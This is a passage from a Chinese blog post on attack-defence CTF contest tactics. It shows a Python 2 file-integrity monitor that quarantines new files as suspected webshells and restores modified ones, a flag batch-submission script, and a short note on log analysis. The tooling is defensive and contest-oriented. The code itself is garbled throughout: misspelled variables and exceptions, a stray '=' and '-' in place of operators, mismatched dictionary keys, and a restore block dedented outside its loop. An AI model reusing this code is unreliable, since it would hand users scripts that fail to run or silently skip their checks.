class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#use: python file_check.py ./</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> ntpath</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">CWD = os.getcwd()</span><br><span class="line">FILE_MD5_DICT = &#123;&#125;	<span class="comment">#文件MD5字典</span></span><br><span class="line">ORIGIN_FILE_LIST = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#特殊文件路径字符串</span></span><br><span class="line">Special_path_str = <span class="string">'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'</span></span><br><span class="line">bakstring = <span class="string">'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'</span></span><br><span class="line">logstring = <span class="string">'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span></span><br><span class="line">webshellstring = <span class="string">'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span></span><br><span class="line">difffile = <span class="string">'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'</span></span><br><span class="line"></span><br><span class="line">Special_string = <span class="string">'drops_log'</span>	<span class="comment">#免死金牌</span></span><br><span class="line">UNICODE_ENCODEING = <span class="string">"utf-8"</span></span><br><span class="line">INVALID_UNICODE_CHAR_FORMAT = <span class="string">r"\?%02x"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件路径字典</span></span><br><span class="line">spec_base_path = os.path.realpath(os.path.join(CWD,Special_path_str))</span><br><span class="line">Special_path = &#123;</span><br><span class="line"><span class="string">'bak'</span> : os.path.realpath(os.path.join(spec_base_path,bakstring)),</span><br><span class="line"><span class="string">'log'</span> : os.path.realpath(os.path.join(spec_base_path,logstring)),</span><br><span class="line"><span class="string">'webshell'</span> : os.path.realpath(os.path.join(spec_base_path,webshellstring)),</span><br><span class="line"><span class="string">'diffile'</span> : os.path.realpath(os.path.join(spec_base_path,diffile)),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isListLike</span><span class="params">(value)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> isinstance(value, (list, tuple, set))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取Unicode编码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUnicode</span><span class="params">(value, encoding=None, noneToNull=False)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> noneTuNull <span class="keyword">and</span> value <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">		<span class="keyword">return</span> noneTuNull</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> isListLike(value):</span><br><span class="line">		value = list(getUnicode(_, encoding, noneToNull) <span class="keyword">for</span> _ <span class="keyword">in</span> value)</span><br><span class="line">		<span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> isinstance(value,unicode):</span><br><span class="line">		<span class="keyword">return</span> value</span><br><span class="line">	<span class="keyword">elif</span> isinstance(value, basestring):</span><br><span class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				<span class="keyword">return</span> unicode(value, encoding <span class="keyword">or</span> UNICODE_ENCODING)</span><br><span class="line">			<span class="keyword">except</span> UnicodeDecodeError, ex:</span><br><span class="line">				<span class="keyword">try</span>:</span><br><span class="line">					<span class="keyword">return</span> unicode(value, UNICODE_ENCODING)</span><br><span class="line">				<span class="keyword">except</span>:</span><br><span class="line">					value = value[:ex.start]+<span class="string">""</span>.join(INVALID_UNICODE_CAHR_FORMAT % ord(_) <span class="keyword">for</span> _ <span class="keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			<span class="keyword">return</span> unicode(value)</span><br><span class="line">		<span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">			<span class="keyword">return</span> unicode(str(value), errors=<span class="string">"ignore"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目录创建</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir_p</span><span class="params">(path)</span>:</span></span><br><span class="line">	<span class="keyword">import</span> errno</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		os.makedirs(path)</span><br><span class="line">	<span class="keyword">except</span> OSRrror <span class="keyword">as</span> exc:</span><br><span class="line">		<span class="keyword">if</span> exc.errno == errno.EEXIST <span class="keyword">and</span> os.path.isdir(path):</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line">		<span class="keyword">else</span>: <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前所有文件路径</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilelist</span><span class="params">(cwd)</span>:</span></span><br><span class="line">	filelist = []</span><br><span class="line">	<span class="keyword">for</span> root,subdirs, files <span class="keyword">in</span> os.walk(cwd):</span><br><span class="line">		<span class="keyword">for</span> filepath <span class="keyword">in</span> files:</span><br><span class="line">			originalfile = os.path.join(root, filepath)</span><br><span class="line">			<span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> originalfile:</span><br><span class="line">				filelist.append(originalfile)</span><br><span class="line">	<span class="keyword">return</span> filelist</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算机文件MD5值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcMD5</span><span class="params">(filepath)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">with</span> open(filepath,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">			md5obj = hashlib.md5()</span><br><span class="line">			md5obj.update(f.read())</span><br><span class="line">			hash = md5obj.hexdigest()</span><br><span class="line">			<span class="keyword">return</span> hash</span><br><span class="line">	<span class="keyword">except</span> Exception, e:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">u'[!] getmd5_error : '</span>+getUnicode(filepath)</span><br><span class="line">		<span class="keyword">print</span> getUnicode(e)</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			ORIGIN_FILE_LIST.remove(fielpath)</span><br><span class="line">			FILE_MD5_DICT.pop(filepath,<span class="keyword">None</span>)</span><br><span class="line">		<span class="keyword">except</span> KeyError, e:</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有文件MD5</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilemd5dict</span><span class="params">(filelist = [])</span>:</span></span><br><span class="line">	filemd5dict = &#123;&#125;</span><br><span class="line">	<span class="keyword">for</span> ori_file <span class="keyword">in</span> filelist:</span><br><span class="line">		<span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> ori_file:</span><br><span class="line">			md5 = calcMD5(os.path.realpath(ori_file))</span><br><span class="line">			<span class="keyword">if</span> md5:</span><br><span class="line">				filemd5dict[ori_file] = md5</span><br><span class="line">	<span class="keyword">return</span> filemd5dict</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份所有文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backup_file</span><span class="params">(filelist=[])</span>:</span></span><br><span class="line">	<span class="comment"># if len(os.listdir(Special_path['bak'])) == 0;</span></span><br><span class="line">	<span class="keyword">for</span> filepath <span class="keyword">in</span> filelist:</span><br><span class="line">		<span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> filepath:</span><br><span class="line">			shutil.copy2(filepathm Special_path[<span class="string">'bak'</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">u'-------------start---------------'</span></span><br><span class="line">	<span class="keyword">for</span> value <span class="keyword">in</span> Special_path:</span><br><span class="line">		mkdir_p(Special_path[value])</span><br><span class="line">	<span class="comment"># 获取所有文件路径，并获取所有文件的MD5，同事备份所有文件</span></span><br><span class="line">	ORIGIN_FILE_LIST = getfilelist(CWD)</span><br><span class="line">	FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">	backup_file(ORIGIN_FILE_LIST) <span class="comment"># TODO 备份文件可能会产生重名BUG</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">u'[*] pre work end!'</span></span><br><span class="line">	<span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">		file_lsit = getfilelist(CWD)</span><br><span class="line">		<span class="comment"># 移除新上传文件</span></span><br><span class="line">		diff_file_list = list(set(file_lsit) ^ set(ORIGIN_FILE_LIST))</span><br><span class="line">		<span class="keyword">if</span> len(diff_file_list) != <span class="number">0</span>:</span><br><span class="line">			<span class="comment"># import pdb;pdb.set_trace()</span></span><br><span class="line">			<span class="keyword">for</span> filepath <span class="keyword">in</span> diff_file_list:</span><br><span class="line">				<span class="keyword">try</span>:</span><br><span class="line">					f = open(filepath, <span class="string">'r'</span>).read()</span><br><span class="line">				<span class="keyword">except</span> Exception, e:</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				<span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">					<span class="keyword">try</span>:</span><br><span class="line">						<span class="keyword">print</span> <span class="string">u'[*] websehll find :'</span> + getUnicode(filepath)</span><br><span class="line">						shutil.move(filepath,os.path.join(Special_path[<span class="string">'webshell'</span>],ntpath.basename(filepath) + <span class="string">'.txt'</span>))</span><br><span class="line">					<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">						<span class="keyword">print</span> <span class="string">u'[!] move webshell error, "%s" maybe is webshell.'</span>%getUnicode(filepath)</span><br><span class="line">					<span class="keyword">try</span>:</span><br><span class="line">						f = open(os.path.join(Special_path[<span class="string">'log'</span>],<span class="string">'log.txt'</span>),<span class="string">'a'</span>)</span><br><span class="line">						f.write(<span class="string">'newfile: '</span> + getUnicode(filepath) = <span class="string">' : '</span> + str(time.ctime()) + <span class="string">'\n'</span>)</span><br><span class="line">						f.close()</span><br><span class="line">					<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">						<span class="keyword">print</span> <span class="string">u'[-] log error : file move error: '</span> + getUnicode(e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 防止任意文件被修改，还原被修改文件</span></span><br><span class="line">md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line"><span class="keyword">for</span> filekey <span class="keyword">in</span> md5_dict:</span><br><span class="line">	<span class="keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			f = open(filekey, <span class="string">'r'</span>).read()</span><br><span class="line">		<span class="keyword">except</span> Exception, e:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				<span class="keyword">print</span> <span class="string">u'[*] file had be change : '</span> + getUnicode(filekey)</span><br><span class="line">				shutil.move(filekey, os.path.join(Special_path[<span class="string">'difffile'</span>], ntpath.basename(filekey) + <span class="string">'.txt'</span>))</span><br><span class="line">				shutil.move(os.path.join(Special_path[<span class="string">'bak'</span>], ntpath.basename(filekey)), filekey)</span><br><span class="line">			<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">				<span class="keyword">print</span> <span class="string">u'[!] move webshell error, "%" maybe is webshell.'</span>%getUnicode(filekey)</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				f = open(os.path.join(Special_path[<span class="string">'log'</span>],<span class="string">'log.txt'</span>),<span class="string">'a'</span>)</span><br><span class="line">				f.write(<span class="string">'diff_file: '</span> + getUnicode(filekey) + <span class="string">' : '</span> + getUnicode(time.ctime()) + <span class="string">'\n'</span>)</span><br><span class="line">				f.close()</span><br><span class="line">			<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">				<span class="keyword">print</span> <span class="string">u'[-] log error : done_diff: '</span> + getUnicode(filekey)</span><br><span class="line">				<span class="keyword">pass</span></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#print `[*] ' + getUnicode(time.ctime())</span></span><br></pre></td></tr></table></figure></p>
<h1 id="七、自动提交"><a href="#七、自动提交" class="headerlink" title="七、自动提交"></a>七、自动提交</h1><p>有的比赛只有几分钟一轮，手工提交其他队伍的flag显然不行，需要准备批量提交flag的脚本：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> httplib</span><br><span class="line"></span><br><span class="line">server_host = <span class="string">'10.10.0.2'</span></span><br><span class="line">server_port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(team_token, flag, host=server_host, port=server_port, timeout=<span class="number">5</span>)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> team_token <span class="keyword">or</span> <span class="keyword">not</span> flag:</span><br><span class="line">		<span class="keyword">raise</span> Exception(<span class="string">'team_token or flag not found'</span>)</span><br><span class="line">	conn = httplib.HTTPConnection(host, port, timeout=timeout)</span><br><span class="line">	params = urllib.urlencode(&#123;</span><br><span class="line">		<span class="string">'token'</span>: team_token,</span><br><span class="line">		<span class="string">'flag'</span>: flag,</span><br><span class="line">		&#125;)</span><br><span class="line">	headers = &#123;</span><br><span class="line">		<span class="string">"Content-type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">	&#125;</span><br><span class="line">	conn.request(<span class="string">'POST'</span>, <span class="string">'/api/submit_flag'</span>, params, headers)</span><br><span class="line">	response = conn.getresponse()</span><br><span class="line">	data - response.read()</span><br><span class="line">	<span class="keyword">return</span> json.loads(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'usage: ./submitflag.py $team_token $flag'</span></span><br><span class="line">		sys.exit()</span><br><span class="line">	host = server_host</span><br><span class="line">	<span class="keyword">if</span> len(sys.argv) &gt; <span class="number">3</span>:</span><br><span class="line">		host = sys.argv[<span class="number">3</span>]</span><br><span class="line">	<span class="keyword">print</span> json.dumps(submit(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>], host=host), indent=<span class="number">4</span>)</span><br></pre></td></tr></table></figure></p>
<h1 id="八、流量、日志"><a href="#八、流量、日志" class="headerlink" title="八、流量、日志"></a>八、流量、日志</h1><p>通过流量、日志的分析：</p>
<ol>
<li>感知可能正在发生的攻击，从而规避存在的安全风险</li>
<li>应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://wx4.sinaimg.cn/mw690/006ALkzYly1fvyfmg5lngj30ya0efn9u.jpg" alt="analysis" title="">
                </div>
                <div class="image-caption">analysis</div>
            </figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://wx1.sinaimg.cn/mw690/006ALkzYly1fvyfmfhytnj30j807rwf9.jpg" alt="php-script" title="">
                </div>
                <div class="image-caption">php-script</div>
            </figure>
</li>
</ol>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p><a href="https://github.com/admintony/Prepare-for-AWD.git" target="_blank" rel="noopener">脚本源码链接</a></p>

        </div>

        <blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    最后更新：<time datetime="2018-10-06T05:25:33.720Z" itemprop="dateUpdated">2018-10-06 13:25:33</time>
</span>


        
    </div>
    <footer>
        <div onclick="location.href='http://www.deops.cn'">
            <img src="/img/avatar.gif" alt="Echo">
            <a>Echo</a>
        </div>
    </footer>
</blockquote>

        
    <div class="page-reward">
        <nav class="myreward">
            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
        </nav>
    </div>



        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/信息安全/">信息安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络空间安全/">网络空间安全</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.deops.cn/posts/28c30eb2/&title=《CTF线下赛AWD套路小结》 — Echo's Blog&pic=http://www.deops.cn/img/avatar.gif" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.deops.cn/posts/28c30eb2/&title=《CTF线下赛AWD套路小结》 — Echo's Blog&source=CTF网络安全攻防赛入门，如果你对黑客攻防感兴趣的话看看这篇入门。新手该知道的一些知识以及技巧，下面简单整理一下" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.deops.cn/posts/28c30eb2/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《CTF线下赛AWD套路小结》 — Echo's Blog&url=http://www.deops.cn/posts/28c30eb2/&via=http://www.deops.cn" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.deops.cn/posts/28c30eb2/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/posts/9bf5b5/" id="post-prev" class="post-nav-link">
        <h4 class="title" >
          上一篇：我学练英语所使用的方法、工具与资料
        </h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/posts/afdfa673/" id="post-next" class="post-nav-link">
        <h4 class="title" data-hover="下一篇：RHEL 7配置Yum软件仓库">下一篇：RHEL 7配置Yum软件仓库</h4>
      </a>
    </div>
  
</nav>



    
    

    

    


</article>

</div>

        <footer class="footer">
    <div class="footer-content">
        <span class="power">
            <i class="icon icon-lg icon-copyright"></i>
            2018
            <i class="icon icon-lg icon-heartbeat"></i>
            <a href="http://www.deops.cn">Echo</a>
            <br/>
            Power by
            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
            Theme
            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
        </span>

        <br/>

        <span id="RunTime" style="color:#a7a7a2;"></span>
        <br/>

        <span>
            
	<i class="icon icon-lg icon-user">
<span id="busuanzi_container_site_uv" style='display:none'>
       访问用户：<span id="busuanzi_value_site_uv"></span>
    </span>人</i>
    ·
    <i class="icon icon-lg icon-eye">
    <span id="busuanzi_container_site_pv" style='display:none'>
      访问次数：<span id="busuanzi_value_site_pv"></span>
    </span>次
    </i>


        </span>
        <br/>

        <!--<span class="license"><a  target="_blank" rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">博客内容遵循 知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>-->
    </div>
</footer>

    </main>
    
        
<div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        <span>感谢您的鼓励支持！</span>
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/wechat.png" data-alipay="/img/alipay.png">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
                <span class="reward-toggle-item alipayPay">支付宝</span>
            </div>
        </label>
        
        <i class="icon icon-caret-up"></i>
    </div>
</div>


    
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.deops.cn/posts/28c30eb2/&title=《CTF线下赛AWD套路小结》 — Echo's Blog&pic=http://www.deops.cn/img/avatar.gif" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.deops.cn/posts/28c30eb2/&title=《CTF线下赛AWD套路小结》 — Echo's Blog&source=CTF网络安全攻防赛入门，如果你对黑客攻防感兴趣的话看看这篇入门。新手该知道的一些知识以及技巧，下面简单整理一下" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.deops.cn/posts/28c30eb2/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《CTF线下赛AWD套路小结》 — Echo's Blog&url=http://www.deops.cn/posts/28c30eb2/&via=http://www.deops.cn" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.deops.cn/posts/28c30eb2/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p class="wechatshare">扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABx0lEQVR42u3ay43DMAwFQPfftLcC2Y+ipHWA0SkIAnmcA8HfdcXnHpzRb/Lvrx0HFxe3zb0fz+iRz6yEOLr/+QZcXNyT3FHESH7z/DJV+osNFxf3k9ycnr8ALi7ur3Pz0mUu3cHFxf0ONw9DScujU1wtq9VwcXEb3LxLue/zlv4uLi7uFPcunuqd1cboy9NxcXGPcDtlzNzopRrIcHFxz3PzBywORnPNFFxc3IPcvFBJmp55m7X6d+Di4p7h5sXJ83ij/MjgLxi+Ni4u7mZuPvicQ3eGKy/FDy4u7mZuNdHJVysKSxXJWgYuLu5nuNVlrLzUqRZCuLi4J7lro0Q1fUlapbi4uCe5+RgjSWUSUD6MiQoqXFzczdy55KP/qpNJFS4u7mbujpWLpBzK27KFyQ8uLu5SbrnwaLRHq0RcXNz/4lYv6qRBeZu1MGnBxcVdxO0kLjuWt648XuLi4m7jVselecirpj5zN+Di4u7j5iONPA3KueXVLlxc3IPcaqCZa5XOpTLDtgguLu7HuHlJ8xwEq2kTLi7uN7nVQctkH3dVIMPFxW1w89XJzlpGPnAtz4RxcXGXcquhpDNGrY5PWv1dXFzcGe4fYClI50odsxQAAAAASUVORK5CYII=" alt="微信分享二维码">
</div>




    <!-- waves按钮特效 -->
<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<!-- 主题配置脚本 -->
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
</script>

<!-- jquery -->
<script src="/js/jquery.min.js?v=3.0"></script>

<!-- 搜索 -->

<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item waves-block waves-effect" onclick="location.href='{path}'">
    <div class="title ellipsis" title="{title}">{title}</div>
</li>
</template>


<!-- main博客脚本 -->
<script src="/js/main.min.js?v=3.0" ></script>

<!-- 动画&配置 -->
<script src="/js/script.min.js?v=3.0" ></script>

<!-- 脚本管理 -->
<script>

if(window.innerWidth > 800){
	/* 3D标题 */
	$(".content-header").on("mousemove", threedee);

	/* 底部追随鼠标 */
	$(".footer").hover(2);

	/* gotop键的涟漪 */
	$("#gotop").hover(1);

	/* 赞赏的粒子雨 */
	$("#reward").hover(3);

	/* 微信公众号的底部渲染 */
	$("#wechat").hover(4);

    /* 标题跳动 */
    $(".archivestitle").bumpyText();

	/* 图片点击放大 */
	const postimg = jQuery(".post-content img:not(.github-emoji)");
	postimg.on("click",function(){

		mask.classList.add("in");
		main.classList.add("Mask");
		menu.classList.add("Mask");
		var myimg = this.cloneNode(true);
		myimg.classList.add("imgShow");

		setTimeout(function(){
			jQuery(myimg).animate({
				opacity:"1"
			},1000);
		},0);

		document.body.appendChild(myimg);

		myimg.onclick=function(){
			document.body.removeChild(myimg);
			mask.classList.remove("in");
			main.classList.remove("Mask");
			menu.classList.remove("Mask");
		};

	});

}

/* 名字跳动 */
$("#name").bumpyText();


/* 网站运行时间 */
setInterval(function () {
	setTime("2018/06/29");
}, 1000);

/* 文章块的淡出 */
postshow();

/* 座右铭 */

   getHitokoto();



/* 粘贴提示 */
G($(".post-content"), location.href, "Echo");


/* 控制台 */
if (window.console && window.console.log) {
	setTimeout(function () {
		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
	}, 0);
}

</script>




<!-- 公式渲染 -->



<!-- 不蒜子 -->

<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script>


<script src="/live2d-widget/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2d-widget/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2d-widget/assets/hijiki.model.json"},"display":{"position":"left","width":50,"height":100,"hOffset":50},"mobile":{"show":false},"log":false});</script></body>
</html>
